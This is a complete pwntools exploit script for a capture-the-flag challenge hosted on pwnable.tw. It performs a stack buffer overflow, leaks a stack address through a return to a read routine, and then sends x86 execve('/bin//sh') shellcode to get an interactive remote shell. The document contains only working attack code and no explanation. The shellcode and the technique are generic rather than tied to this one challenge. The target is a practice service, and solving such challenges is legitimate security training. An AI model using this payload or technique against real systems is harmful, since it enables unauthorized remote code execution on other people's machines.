from pwn import *
context.log_level='debug'

n = remote('chall.pwnable.tw',10000)

read_addr = 0x08048087
shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80'

payload1 = b'A'*20
payload1 += p32(read_addr)

n.recvuntil('Let\'s start the CTF:')
n.send(payload1)
stack_leak = u32(n.recv(4))

payload2 = b'A'*20
payload2 += p32(stack_leak+20)
payload2 += shellcode

n.send(payload2)

n.interactive()
